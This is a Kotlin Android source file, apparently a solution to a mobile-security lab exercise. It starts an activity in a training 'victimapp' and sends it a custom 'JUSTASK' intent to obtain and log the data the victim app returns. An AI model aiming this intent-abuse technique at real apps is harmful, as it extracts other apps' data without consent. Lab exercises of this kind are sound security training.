package com.example.lab3justask

import android.app.Activity
import android.content.ActivityNotFoundException
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log


class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val intent = Intent()
        intent.setComponent(
            ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.PartFour"
            )
        )

        Log.i("st", "try to start activity")
        startActivity(intent)
        if (intent?.action == "com.example.victimapp.intent.action.JUSTASK") {
            val value = intent.data

            Log.d("Int3nt", value.toString())

        } else {
            Log.e("HASH", "Intent non riconosciuto")
            val ACTION_TIMETRAVEL = "com.example.victimapp.intent.action.JUSTASK"
            val sendIntent = Intent().apply {
                action = ACTION_TIMETRAVEL
            }
            try {
                startActivityForResult(sendIntent,1)
                Log.d("ww", "work")
            } catch (e: ActivityNotFoundException) {
                // Define what your app should do if no activity can handle the intent.
                Log.e("nww", "not working")
            }
            finish()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        Log.i("Result", data?.data.toString())
    }
}

